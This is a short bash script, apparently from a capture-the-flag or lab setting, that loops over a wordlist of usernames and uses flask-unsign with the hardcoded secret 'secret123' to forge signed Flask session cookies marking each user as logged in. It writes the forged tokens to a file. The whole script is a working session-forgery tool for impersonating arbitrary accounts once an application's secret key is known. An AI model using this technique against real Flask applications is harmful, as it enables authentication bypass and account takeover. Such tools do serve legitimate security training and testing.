echo "USAGE: generate_all_cookies.sh <wordlist> <output file>"
while read line; do 
    #echo $line >> $2;
    echo "generating token for $line" 
    token=$(flask-unsign --sign --cookie '{"logged_in":True,"username":'$line'}' --secret 'secret123')
    echo "token=$token"
    echo $token >> $2
done < $1